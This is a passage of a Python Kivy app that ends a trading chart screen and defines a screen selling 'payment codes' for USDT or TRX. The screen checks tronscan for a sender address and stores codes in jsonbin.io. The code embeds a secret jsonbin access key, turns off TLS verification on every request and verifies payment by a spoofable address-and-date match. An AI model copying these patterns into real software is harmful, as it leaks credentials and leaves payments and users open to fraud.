                self.rect_R3_2 = Polygon(self.xyR3_2, closed=True, linewidth=self.grosor_linea3, edgecolor='w', facecolor='r', alpha=0.3)
                self.ax.add_patch(self.rect_R3_2)                
                self.grfresisteb,=self.ax.plot(0,0, color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                self.grfsoporteb,=self.ax.plot(0,0, color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
                # rendimiento en binarias
                #self.ax25 = inset_axes(self.ax, width="40%", height="15%", loc='upper left')             
                #self.ax25.set_title("Development of capital",fontsize=self.tamanio_letra,pad=10, color='white') 
                #self.ax25.set_facecolor((0, 0, 0, 1))
                #self.ax25.grid(False)                                           
                #self.ax25.yaxis.set_ticks_position('right')                   
                #max_de_capital=float("{0:.2f}".format(max(self.registro_saldo)))
                #min_de_capital=float("{0:.2f}".format(min(self.registro_saldo)))                             
                #indice = range(len(self.registro_saldo))                    
                #self.binaria, = self.ax25.plot(indice,self.registro_saldo,"wo-",linewidth=self.grosor_linea3,ms=2)
                #self.ax25.set_xlim(0,1)                    
                #margin = 0.4 * (max(self.registro_saldo) - min(self.registro_saldo))
                #self.ax25.set_ylim(min(self.registro_saldo) - margin, max(self.registro_saldo) + margin*self.escly)
                #self.capital_maximo= self.ax25.axhline(y=max_de_capital, color="green", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                #self.capital_minimo= self.ax25.axhline(y=min_de_capital, color="red", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
                #axadsdsd=float("{0:.2f}".format(self.registro_saldo[-1]))               
                #self.ax25.legend([self.binaria,self.capital_maximo,self.capital_minimo],[f"Cap: {axadsdsd} USD",f"Max: {max_de_capital} USD",f"Min: {min_de_capital} USD"],edgecolor="black",loc ='upper center', labelcolor="white", ncol=5, fontsize=6,labelspacing=0.1,facecolor="k",bbox_to_anchor=(0.5, self.niv_pos))                                
                #self.ax25.tick_params(axis='y', labelsize=self.tamanio_valores, labelcolor='white', which='major')
                #self.ax25.tick_params(axis='x', labelsize=self.tamanio_valores, labelcolor='none', which='major')
                #--------Volumen del mercado------------------------------------------------------------------------------------------------------------------------------------------------------------------  
                #self.ax26 = inset_axes(self.ax, width="100%", height="15%", loc='upper right')             
                #self.ax26.set_title("Market activity",fontsize=self.tamanio_letra,pad=10, color='white') 
                #self.ax26.set_facecolor((0, 0, 0, 1))
                #self.ax26.grid(False)                                           
                #self.ax26.yaxis.set_ticks_position('right')
                #self.ax26.tick_params(axis='y', labelsize=self.tamanio_valores, labelcolor='white', which='major')
                #self.ax26.tick_params(axis='x', labelsize=self.tamanio_valores, labelcolor='none', which='major')                 
                #indice_volumen_market = range(len(self.volumen_market))                    
                #self.binaria_111, = self.ax26.plot(indice_volumen_market,self.volumen_market,"wo-",linewidth=self.grosor_linea3,ms=2)
                #self.promedio_volumen = self.ax26.axhline(y=0, color="red", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)                
                self.canvas = FigureCanvasKivyAgg(self.figz)
                #self.cid = self.figz.canvas.mpl_connect('motion_notify_event', self.on_movex)                    
                self.figura_guardada.add_widget(self.canvas)    
                #Contenedor_operaciones1.add_widget(self.widget15_2333)
                Contenedor_operaciones1.add_widget(self.widget15_2)
                Contenedor_operaciones1.add_widget(self.widget15_1)                
                Contenedor_operaciones1.add_widget(self.widget15_2333xxx)                   
                Contenedor_operaciones.add_widget(Contenedor_operaciones1)  
                self.Contenedor_2a.add_widget(self.figura_guardada)
                #self.Contenedor_2a.add_widget(Contenedor_operaciones)
                self.Contenedor_22a = BoxLayout(orientation='horizontal', size_hint=(1, self.anch_boton),spacing=3)
                self.main_layout.add_widget(self.Contenedor_2a) 
                self.Contenedor_22a.add_widget(self.spinner)
                self.main_layout.add_widget(self.Contenedor_22a)
                with self.main_layout.canvas.before:
                    Color(0, 0, 0, 1)  # Color blanco (RGBA)
                    self.rect = Rectangle(size=self.main_layout.size, pos=self.main_layout.pos)
                self.main_layout.bind(size=self._update_rect, pos=self._update_rect)                                                 
                Clock.schedule_once(self.hacer_lista)                           
                Clock.schedule_interval(self.cot, 1)
            else:
                None                   
        except:                            
            None
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------                
class Comprar_producto(Screen):
    def __init__(self, **kwargs):
        super(Comprar_producto, self).__init__(**kwargs)
        self.var_conex=0
        self.variable_padding=8
        self.variable_spacing=8
        self.btc=0
        self.eth=0
        self.theter=0
        self.litecoin=0
        self.trx=0
        self.varxxx=0
        self.interval1=0
        self.variable_precionarboton="no presionado"
        self.fechahoracomprobacion=0
        self.esp=48
        self.contador_de_comprobacion_pago=0       
        self.precio_de_criptomoneda_elegida="-"
        self.TAMAÑO_TEXTOS='10sp'
        self.estilo_letra='Roboto' 
        self.main_layout = BoxLayout(orientation='vertical', padding=self.variable_padding, spacing=self.variable_spacing)
        #-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
        with self.main_layout.canvas.before:
            Color(0, 0, 0, 1)  # Color blanco (RGBA)
            self.rect20 = Rectangle( size=self.main_layout.size, pos=self.main_layout.pos)
        #-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
        # Actualizar el tamaño del rectángulo cuando el layout cambie de tamaño
        self.main_layout.bind(size=self._update_rect20, pos=self._update_rect20)
        Contenedor_5CCC0 = BoxLayout(orientation='vertical', size_hint=(1, 0.1))
        self.Contenedor_5CCC01 = BoxLayout(orientation='vertical', size_hint=(1, 0.3))
        self.Contenedor_5CCC1 = BoxLayout(orientation='vertical', size_hint=(1, 0.1))
        Contenedor_5CCC2 = BoxLayout(orientation='horizontal', size_hint=(1, 0.15))
        Contenedor_5CCC2xx = BoxLayout(orientation='horizontal', size_hint=(0.2, 1))
        self.Contenedor_5CCC2xxsss = BoxLayout(orientation='horizontal', size_hint=(1,0.1))
        Contenedor_5CCC3 = BoxLayout(orientation='vertical', size_hint=(1, 0.15))
        Contenedor_5CCC3xxx = BoxLayout(orientation='vertical', size_hint=(1, 0.08))
        Contenedor_5CCC3ggg = BoxLayout(orientation='horizontal', size_hint=(1, 0.15))       
        Contenedor_5CCC2vvvv = BoxLayout(orientation='horizontal', size_hint=(1, 0.15))
        Contenedor_5CCC2xxvvv = BoxLayout(orientation='horizontal', size_hint=(0.2, 1))
        self.Contenedor_5CCC2labell = BoxLayout(orientation='vertical', size_hint=(1,0.15))       
        self.Contenedor_5CCC1ttt = BoxLayout(orientation='vertical', size_hint=(1, 0.1))        
        Contenedor_5CCC2tttvvvv = BoxLayout(orientation='horizontal', size_hint=(1, 0.15))
        Contenedor_5CCC1ttt111 = BoxLayout(orientation='vertical', size_hint=(0.2, 1))        
        self.Contenedor_5CCC1tttxxx = BoxLayout(orientation='vertical', size_hint=(1, 0.1)) 
        self.Contenedor_5CCC1tttxxx1 = BoxLayout(orientation='vertical', size_hint=(1, 0.1))
        Contenedor_5CCC2tttvvvvxxx = BoxLayout(orientation='horizontal', size_hint=(1, 0.15))
        Contenedor_5CCC1ttt111xxx = BoxLayout(orientation='vertical', size_hint=(0.2, 1))       
        self.Contenedor_calculo_compra = BoxLayout(orientation='vertical', size_hint=(1, 0.25))        
        self.spinner_compra = Spinner(
            text="Buy a payment code with: (USDT_TRC20):",
            values=("Buy a payment code with: (USDT_TRC20):","Buy a payment code with: (TRX):"
                    ),font_size=self.TAMAÑO_TEXTOS,font_name=self.estilo_letra,            
            size=(15, 15),background_normal='', background_color=color_botones)
        self.spinner_compra.bind(text=self.seleccionar_forma_pago)
        self.widget100 = Label(color=(1, 1, 1, 1),size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget100.bind(size=self._update_text_size2)        
        self.widget103 = TextInput(hint_text='', multiline=False,halign='left', background_normal='', foreground_color=(0.5, 0.5, 0.5, 1), background_color=(0, 0, 0, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,readonly=True)
        self.widget103.bind(focus=self.on_focus3)
        self.widget104 = Button(text='Copy', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget104.bind(on_press=self.paste_from_clipboard104)
        self.widget105 = Label(color=(1, 1, 1, 1),size_hint_x=1,  halign='left', valign='middle', font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget105.bind(size=self._update_text_size3)        
        self.widget106 = TextInput(hint_text='', multiline=False,halign='left', background_normal='',foreground_color=(0.5, 0.5, 0.5, 1), background_color=(0, 0, 0, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget106.bind(focus=self.on_focus4)
        self.widget107 = Button(text="Paste", background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget107.bind(on_press=self.paste_from_clipboard107)
        self.widget108 = Label(text="Current purchase price of the payment code:",color=(1, 1, 1, 1), size_hint_x=1,  halign='left', valign='middle', text_size=(self.Contenedor_5CCC2labell.width, None),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget108.bind(size=self._update_text_size1)       
        self.widget111 = Label(text='COINEX_AUTOMATIC_TRADING user:', size_hint_x=1,  halign='left', valign='middle', color=(1, 1, 1, 1), font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget111.bind(size=self._update_text_size4)
        self.widget112 = TextInput(hint_text="Please create your COINEX_AUTOMATIC_TRADING user", multiline=False,halign='left', background_normal='',foreground_color=(0.5, 0.5, 0.5, 1), background_color=(0, 0, 0, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget112.bind(focus=self.on_focus5)
        self.widget113 = Button(text="Paste", background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget113.bind(on_press=self.paste_from_clipboard113)
        self.widget111x = Label(text="Payment code purchased:",color=(1, 1, 1, 1),size_hint_x=1,  halign='left', valign='middle', font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget111x .bind(size=self._update_text_size5)        
        self.widget111x1 = Label(text="(Note: You can always retrieve your payment code by using the cryptocurrency address and user that you used to make your purchase.)",color=(1, 1, 1, 1),size_hint_x=1,  halign='left', valign='middle', font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget111x1 .bind(size=self._update_text_size10)        
        self.widget112x = TextInput(hint_text='Your purchased payment code will be displayed here', multiline=False,halign='left', background_normal='',foreground_color=(0.5, 0.5, 0.5, 1), background_color=(0, 0, 0, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,readonly=True)
        self.widget112x.bind(focus=self.on_focus6)
        self.widget113x = Button(text='Copy', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget113x.bind(on_press=self.paste_from_clipboard113x)
        self.widget110 = Label(text="-",color=(1, 1, 1, 1),size_hint_x=1,  halign='left', valign='middle', font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget110 .bind(size=self._update_text_size6)        
        self.widget116 = Label(text="-",color=(1, 1, 1, 1),size_hint_x=1,  halign='left', valign='middle', font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget116 .bind(size=self._update_text_size7)
        self.widget117 = Label(text="Check your Internet connection.",color=(1, 1, 1, 1),size_hint_x=1,  halign='left', valign='middle', font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget117 .bind(size=self._update_text_size8)
        self.widget118 = Label(text="Check your Internet connection.",color=(1, 1, 1, 1),size_hint_x=1,  halign='left', valign='middle', font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget118 .bind(size=self._update_text_size9)
        self.widget1ss = Label(text="For any questions or suggestions, contact by WHATSAPP: +53 63621888",color=(1, 1, 1, 1),size_hint_x=1,  halign='left', valign='middle', font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget1ss .bind(size=self._update_text_size5xxx)
        self.COMPROBAR_button = Button(text='Confirm purchase and receive purchased Payment code',background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.COMPROBAR_button.bind(on_press=self.ejecutar_COMPROBAR_TRANFERENCIAS)
        if self.spinner_compra.text=="Buy a payment code with: (USDT_TRC20):":
            self.dirreccion_pago="TRajftdF9ZtVsAgVPHXVsZ1XZPv4PoW2p2"                        
            self.widget100.text = "Address of cryptocurrencies to be sent (USDT_TRC20):"            
            self.widget105.text = "Cryptocurrency Sending Address (USDT_TRC20):"
            self.widget103.text="TRajftdF9ZtVsAgVPHXVsZ1XZPv4PoW2p2"            
            self.widget116.text = "Calculation of the amount of (USDT_TRC20) to be sent:"
            self.widget106.hint_text="Please enter the address of the cryptocurrency\nyou are sending (USDT_TRC20)"
        elif self.spinner_compra.text=="Buy a payment code with: (TRX):":
            self.dirreccion_pago="TRajftdF9ZtVsAgVPHXVsZ1XZPv4PoW2p2"                        
            self.widget100.text = "Address of cryptocurrencies to be sent (TRX):"            
            self.widget105.text = "Cryptocurrency Sending Address (TRX):"
            self.widget103.text="TRajftdF9ZtVsAgVPHXVsZ1XZPv4PoW2p2"            
            self.widget116.text = "Calculation of the amount of (TRX) to be sent:"
            self.widget106.hint_text="Please enter the address of the cryptocurrency\nyou are sending (TRX)"
        qr = qrcode.QRCode(
            version=1,  # Controla el tamaño del código QR
            error_correction=qrcode.constants.ERROR_CORRECT_L,  # Controla la corrección de errores
            box_size=5,  # Tamaño de cada caja en el código QR
            border=2,  # Ancho del borde
        )   
        # Agrega la dirección de Bitcoin al código QR
        qr.add_data(self.dirreccion_pago)
        qr.make(fit=True)    
        # Genera la imagen del código QR
        img = qr.make_image(fill='black', back_color='white')    
        # Convierte la imagen a un formato que Kivy puede mostrar
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)    
        # Crea un objeto Kivy Image
        kivy_image = CoreImage(img_byte_arr, ext='png')        
        Volver_button = Button(text='Back', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        Volver_button.bind(on_press=self.comprar_volver)
        Contenedor_5CCC0.add_widget(self.spinner_compra)       
        self.Contenedor_5CCC01.add_widget(Image(texture=kivy_image.texture))
        self.Contenedor_5CCC1.add_widget(self.widget100)
        Contenedor_5CCC2.add_widget(self.widget103)
        Contenedor_5CCC2xx.add_widget(self.widget104)       
        Contenedor_5CCC2.add_widget(Contenedor_5CCC2xx)
        self.Contenedor_5CCC2xxsss.add_widget(self.widget105)
        Contenedor_5CCC3ggg.add_widget(self.COMPROBAR_button)        
        Contenedor_5CCC3.add_widget(Volver_button)
        Contenedor_5CCC3xxx.add_widget(self.widget1ss)
        Contenedor_5CCC2vvvv.add_widget(self.widget106)
        Contenedor_5CCC2xxvvv.add_widget(self.widget107)
        Contenedor_5CCC2vvvv.add_widget(Contenedor_5CCC2xxvvv)
        self.Contenedor_5CCC2labell.add_widget(self.widget108)
        self.Contenedor_5CCC2labell.add_widget(self.widget110)        
        self.Contenedor_5CCC1tttxxx.add_widget(self.widget111x)
        self.Contenedor_5CCC1tttxxx1.add_widget(self.widget111x1)
        Contenedor_5CCC2tttvvvvxxx.add_widget(self.widget112x)
        Contenedor_5CCC1ttt111xxx.add_widget(self.widget113x)
        Contenedor_5CCC2tttvvvvxxx.add_widget(Contenedor_5CCC1ttt111xxx)
        self.Contenedor_5CCC1ttt.add_widget(self.widget111)
        Contenedor_5CCC2tttvvvv.add_widget(self.widget112)
        Contenedor_5CCC1ttt111.add_widget(self.widget113)
        Contenedor_5CCC2tttvvvv.add_widget(Contenedor_5CCC1ttt111)
        self.Contenedor_calculo_compra.add_widget(self.widget116)
        self.Contenedor_calculo_compra.add_widget(self.widget117)
        self.Contenedor_calculo_compra.add_widget(self.widget118)
        self.main_layout.add_widget(Contenedor_5CCC0)
        self.main_layout.add_widget(self.Contenedor_5CCC01)
        self.main_layout.add_widget(self.Contenedor_5CCC1)
        self.main_layout.add_widget(Contenedor_5CCC2)        
        self.main_layout.add_widget(self.Contenedor_5CCC2xxsss)      
        self.main_layout.add_widget(Contenedor_5CCC2vvvv)               
        self.main_layout.add_widget(self.Contenedor_5CCC1ttt)
        self.main_layout.add_widget(Contenedor_5CCC2tttvvvv)
        self.main_layout.add_widget(self.Contenedor_5CCC2labell)        
        self.main_layout.add_widget(self.Contenedor_calculo_compra)
        self.main_layout.add_widget(self.Contenedor_5CCC1tttxxx)        
        self.main_layout.add_widget(Contenedor_5CCC2tttvvvvxxx)
        self.main_layout.add_widget(self.Contenedor_5CCC1tttxxx1)
        self.main_layout.add_widget(Contenedor_5CCC3xxx)
        self.main_layout.add_widget(Contenedor_5CCC3ggg)
        self.main_layout.add_widget(Contenedor_5CCC3)        
        self.add_widget(self.main_layout)        
        Clock.schedule_once(self.precio_buy)
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------          
    def _update_text_size1(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget108.text_size = (self.widget108.width, None)  # Permitir que el texto se ajuste
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------     
    def _update_text_size2(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget100.text_size = (self.widget100.width, None)  # Permitir que el texto se ajuste
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------     
    def _update_text_size3(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget105.text_size = (self.widget105.width, None)  # Permitir que el texto se ajuste
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------     
    def _update_text_size4(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget111.text_size = (self.widget111.width, None)  # Permitir que el texto se ajuste
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------     
    def _update_text_size5(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget111x.text_size = (self.widget111x.width, None)  # Permitir que el texto se ajuste
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------         
    def _update_text_size5xxx(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget1ss.text_size = (self.widget1ss.width, None)  # Permitir que el texto se ajuste    
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------    
    def _update_text_size6(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget110.text_size = (self.widget110.width, None)  # Permitir que el texto se ajuste
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------     
    def _update_text_size7(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget116.text_size = (self.widget116.width, None)  # Permitir que el texto se ajuste
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    def _update_text_size8(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget117.text_size = (self.widget117.width, None)  # Permitir que el texto se ajuste
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    def _update_text_size9(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget118.text_size = (self.widget118.width, None)  # Permitir que el texto se ajuste
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    def paste_from_clipboard107(self, instance):
        # Obtener el contenido del portapapeles y establecerlo en el TextInput
        self.widget106.text = Clipboard.paste()      
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------     
    def paste_from_clipboard113(self, instance):
        # Obtener el contenido del portapapeles y establecerlo en el TextInput
        self.widget112.text = Clipboard.paste()      
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
    def paste_from_clipboard104(self, instance):
        # Obtener el contenido del portapapeles y establecerlo en el TextInput
        Clipboard.copy(self.widget103.text)      
    
    def paste_from_clipboard113x(self, instance):
        # Obtener el contenido del portapapeles y establecerlo en el TextInput
        Clipboard.copy(self.widget112x.text)
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    def _update_text_size10(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget111x1.text_size = (self.widget111x1.width, None)  # Permitir que el texto se ajuste    
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    def comprar_volver(self, instance):
        self.manager.current = 'iqoption_trading'  # Cambiar a la pantalla login
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
    def ejecutar_COMPROBAR_TRANFERENCIAS(self, instance):
        if self.widget106.text=="" and self.widget112.text=="":                                               
            None                 
        elif self.widget106.text == "" and self.widget112.text !="":                        
            None
        elif self.widget106.text != "" and self.widget112.text =="":
            None 
        else:
            self.widget112x.text=""
            if self.variable_precionarboton=="no presionado":
                self.variable_precionarboton="presionado"
                Clock.schedule_once(self.COMPROBAR_TRANFERENCIAS_11)
                           
            else:
                None
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    def on_focus3(self, instance, value):
        if value:  # Cuando el widget tiene foco
            instance.background_color = (1, 1, 1, 1)  # Fondo blanco
        else:  # Cuando el widget pierde el foco
            instance.background_color = (0, 0, 0, 1)  # Fondo negro
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------             
    def on_focus4(self, instance, value):
        if value:  # Cuando el widget tiene foco
            instance.background_color = (1, 1, 1, 1)  # Fondo blanco
        else:  # Cuando el widget pierde el foco
            instance.background_color = (0, 0, 0, 1)  # Fondo negro
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    def on_focus5(self, instance, value):
        if value:  # Cuando el widget tiene foco
            instance.background_color = (1, 1, 1, 1)  # Fondo blanco
        else:  # Cuando el widget pierde el foco
            instance.background_color = (0, 0, 0, 1)  # Fondo negro
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    def on_focus6(self, instance, value):
        if value:  # Cuando el widget tiene foco
            instance.background_color = (1, 1, 1, 1)  # Fondo blanco
        else:  # Cuando el widget pierde el foco
            instance.background_color = (0, 0, 0, 1)  # Fondo negro
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------            
    def COMPROBAR_TRANFERENCIAS_11(self,dt):
        Clock.schedule_once(self.COMPROBAR_TRANFERENCIAS)
        self.interval1= Clock.schedule_interval(self.COMPROBAR_TRANFERENCIAS, 20)
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    def COMPROBAR_TRANFERENCIAS(self, dt):
        try:
            if self.contador_de_comprobacion_pago==20:
                self.variable_precionarboton="no presionado"
                self.widget112x.hint_text="Please wait a few minutes and try again..."
                self.contador_de_comprobacion_pago=0            
                if hasattr(self, 'interval1'):
                    Clock.unschedule(self.interval1)
                    self.interval1=0    
                return
            else:            
                if self.spinner_compra.text=="Buy a payment code with: (USDT_TRC20):" or self.spinner_compra.text=="Buy a payment code with: (TRX):":
                    if self.widget106.text=="" and self.widget112.text=="":                                               
                        self.variable_precionarboton="no presionado"                  
                    elif self.widget106.text == "" and self.widget112.text !="":                        
                        self.variable_precionarboton="no presionado" 
                    elif self.widget106.text != "" and self.widget112.text =="":
                        self.variable_precionarboton="no presionado" 
                    else:
                        self.contador_de_comprobacion_pago=self.contador_de_comprobacion_pago+1                               
                        address=self.dirreccion_pago
                        url = f'https://api.tronscan.org/api/transaction?address={address}&limit=600'
                        response = requests.get(url,verify=False)                     
                        dirrecion_que_tranfiere=self.widget106.text 
                        lista_owner_address=[]
                        tiempo_de_transaccion=[]
                        if response.status_code == 200:
                            data = response.json()
                            transactions = data.get('data', []) 
                            for i in range(len(transactions)):
                                mi_diccionario_0=transactions[i]
                                mi_diccionario_1=mi_diccionario_0['contractData']
                                mi_diccionario_x=mi_diccionario_0['timestamp']
                                mi_diccionario_2=mi_diccionario_1['owner_address']
                                lista_owner_address.append(mi_diccionario_2)
                                timestamp_segundos = mi_diccionario_x / 1000   
                                # Convertir a objeto datetime
                                
                                fecha_hora = datetime.fromtimestamp(timestamp_segundos)
                                # Mostrar la fecha y hora
                                tiempo_fecha_hora= fecha_hora.strftime('%Y-%m-%d %H:%M:%S')
                                guardarfecha=tiempo_fecha_hora[:10]
                                tiempo_de_transaccion.append(guardarfecha)
                            if dirrecion_que_tranfiere in lista_owner_address:                           
                                api_key = '$2a$10$hVNZ6cA/ceNajtEBnfJFOejczv//zQIUVoF3QnQNmVfmGMUIxkjmi'
                                bin_id = '66d5f3e1e41b4d34e4291eeb' 
                                url = f'https://api.jsonbin.io/v3/b/{bin_id}/latest'               
                                headers = {
                                    'X-ACCESS-KEY': api_key
                                }
                                
                                # Enviar solicitud GET para recuperar el bin
                                response = requests.get(url, headers=headers,verify=False) 
                               
                                if response.status_code == 200:
                                    datos = response.json()
                                    mensaje_salvaPay = datos['record']
                                    direnvi=self.widget106.text
                                    userenvi=self.widget112.text
                                    convinaruserdir=direnvi+f"_{userenvi}"
                                    if convinaruserdir in mensaje_salvaPay:
                                        asdads= mensaje_salvaPay[convinaruserdir]                                        
                                        self.widget112x.text=asdads[0]                                        
                                        self.variable_precionarboton="no presionado"
                                        if hasattr(self, 'interval1'):
                                            Clock.unschedule(self.interval1)
                                            self.interval1=0    
                                        return
                                    else:
                                        indice = lista_owner_address.index(dirrecion_que_tranfiere)
                                        tiempo_ejecucion_tranferencia=tiempo_de_transaccion[indice]
                                        now = datetime.now()
                                        datetime_nueva_york = now.strftime("%Y-%m-%d %H:%M:%S")
                                        tiempo_internet_actual=datetime_nueva_york[:10]
                                        self.fechahoracomprobacion=datetime_nueva_york
                                        dkasdka=self.fechahoracomprobacion                  
                                        self.widget112x.hint_text=f"Checking payment automatically. Date and time: {dkasdka}"
                                        tiempo_internet_actual=datetime_nueva_york[:10]
                                        if tiempo_ejecucion_tranferencia==tiempo_internet_actual:
                                            api_key = '$2a$10$hVNZ6cA/ceNajtEBnfJFOejczv//zQIUVoF3QnQNmVfmGMUIxkjmi'
                                            bin_id = '66cf85e8acd3cb34a87adfb6' 
                                            url = f'https://api.jsonbin.io/v3/b/{bin_id}/latest'               
                                            headers = {
                                                'X-ACCESS-KEY': api_key
                                            }
                                            
                                            # Enviar solicitud GET para recuperar el bin
                                            response = requests.get(url, headers=headers,verify=False) 
                                            
                                            if response.status_code == 200:
                                                datos = response.json()
                                                mensaje = datos['record']
                                                dato_aleatorio = random.choice(mensaje)
                                                akldasdal=len(self.widget112.text)
                                                x1=str(akldasdal)
                                                if akldasdal>=10:                                         
                                                    x1s=x1[0]
                                                    x2s=x1[1]
                                                else:
                                                    x1s="0"
                                                    x2s=x1[0]                                        
                                                nuevo_string = dato_aleatorio[:13] + x1s + x2s + dato_aleatorio[15:]
                                                
                                                diccion_clave = mensaje_salvaPay
                                                claveinsert=convinaruserdir
                                                listainsert_claveinsert=[nuevo_string]
                                                diccion_clave[claveinsert] = listainsert_claveinsert
                                                api_key = '$2a$10$hVNZ6cA/ceNajtEBnfJFOejczv//zQIUVoF3QnQNmVfmGMUIxkjmi'
                                                bin_id = '66d5f3e1e41b4d34e4291eeb'
                                                nuevos_datos = diccion_clave
                                                url = f'https://api.jsonbin.io/v3/b/{bin_id}'
                                                headers = {
                                                    'Content-Type': 'application/json',
                                                    'X-ACCESS-KEY': api_key
                                                }
                                                response = requests.put(url, headers=headers, data=json.dumps(nuevos_datos), verify=False)
                                            
                                                if response.status_code == 200:
                                                    self.widget112x.text=nuevo_string
                                                    #self.widget4.text=nuevo_string
                                                    #self.comprar_volver(0)
                                                    self.variable_precionarboton="no presionado"
                                                    if hasattr(self, 'interval1'):
                                                        Clock.unschedule(self.interval1)
                                                        self.interval1=0    
                                                    return                      
                            else:
                                now = datetime.now()
                                datetime_nueva_york = now.strftime("%Y-%m-%d %H:%M:%S")                             
                                self.fechahoracomprobacion=datetime_nueva_york
                                dkasdka=self.fechahoracomprobacion                  
                                self.widget112x.hint_text=f"Checking payment automatically. Date and time: {dkasdka}" 
        except:
            None                          
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------                   
    def calcular_precio_codigo_pago(self,dt):
        try:
            criptos = []
            if self.spinner_compra.text=="Buy a payment code with: (USDT_TRC20):":
                criptos.append('tether')
                
            elif self.spinner_compra.text=="Buy a payment code with: (TRX):":
                criptos.append('tron')
                
            if criptos[0]=='tether' and  self.theter==0:   
                def obtener_precio(criptos):
                    url = f"https://api.coingecko.com/api/v3/simple/price?ids={','.join(criptos)}&vs_currencies=usd"
                    respuesta = requests.get(url,verify=False)
                    
                    datos = respuesta.json()
                    return datos
                # Obtener precios
                precios = obtener_precio(criptos)
                
                # Imprimir precios
                for cripto in criptos:
                    
                    kadkakdj=f"{precios[cripto]['usd']}"
                    self.theter=float(kadkakdj)
            elif criptos[0]=='tron' and  self.trx==0:
                def obtener_precio(criptos):
                    url = f"https://api.coingecko.com/api/v3/simple/price?ids={','.join(criptos)}&vs_currencies=usd"
                    respuesta = requests.get(url,verify=False)
                   
                    datos = respuesta.json()
                    return datos
                # Obtener precios
                precios = obtener_precio(criptos)
                
                # Imprimir precios
                for cripto in criptos:
                    
                    kadkakdj=f"{precios[cripto]['usd']}"
                    self.trx=float(kadkakdj)
            
            asdhad=criptos[0]
            if asdhad== 'tether':
                dsasd=self.theter
                dkajd="USD"
            elif asdhad== 'tron':
                dsasd=self.trx
                dkajd="TRX"
            mi_string5 = f"Current price of {asdhad}: {dsasd} USD"
            
            self.widget117.text = mi_string5
    
            DSHDHJ0=self.widget110.text
            SQSQWSQ=DSHDHJ0[0:2]        
            AKJSDJADJ=float(SQSQWSQ)
            
            calculo_en_usd=float("{0:.5f}".format(AKJSDJADJ/dsasd))
            if calculo_en_usd>1:
                sqsqs=round(calculo_en_usd)
            else:
                 sqsqs=calculo_en_usd  
